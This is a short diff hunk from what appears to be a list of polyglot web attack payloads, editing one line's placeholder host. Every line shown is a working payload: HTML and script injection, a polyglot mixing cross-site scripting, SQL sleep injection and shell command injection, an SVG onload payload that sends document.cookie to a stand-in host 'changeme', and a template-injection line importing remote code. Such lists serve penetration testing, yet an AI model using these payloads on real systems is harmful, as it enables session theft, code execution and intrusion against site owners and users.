@@ -46,4 +46,4 @@ sfds"><base href="https://changeme"><script nonce='secret' src='./htmli'></scrip
 https://changeme?'XOR/*'><svg/onload=confirm`{{10*10}}>*/(if(1=1,sleep(10),0))OR';sleep${IFS}10;#${IFS}
 '"><svg onx=() onload=(location.href='https://changeme/'+document['cookie'])()>
 {{constructor.constructor('import("https://changeme")')()}}
-"-alert(window['alert'](document[location=atob`changeme`]))-"XYZ
+"-alert(window['alert'](document[location=atob`https://changeme`]))-"XYZ
